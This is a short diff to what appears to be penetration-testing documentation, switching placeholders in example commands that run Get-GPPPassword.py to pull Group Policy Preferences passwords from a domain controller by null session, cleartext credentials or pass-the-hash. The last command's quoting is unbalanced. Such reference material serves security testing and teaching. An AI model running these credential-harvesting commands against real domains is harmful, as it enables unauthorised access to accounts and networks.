@@ -24,10 +24,10 @@ From UNIX-like systems, the [Get-GPPPassword.py](https://github.com/SecureAuthCo
 
 ```bash
 # with a NULL session
-Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
+Get-GPPPassword.py -no-pass "$DC_HOST"
 
 # with cleartext credentials
-Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+Get-GPPPassword.py "$DOMAIN/$USER:$PASSWORD@$DC_HOST"
 
 # pass-the-hash
 Get-GPPPassword.py -hashes ":$NT_HASH" "$DOMAIN"/"$USER@"$DC_HOST"
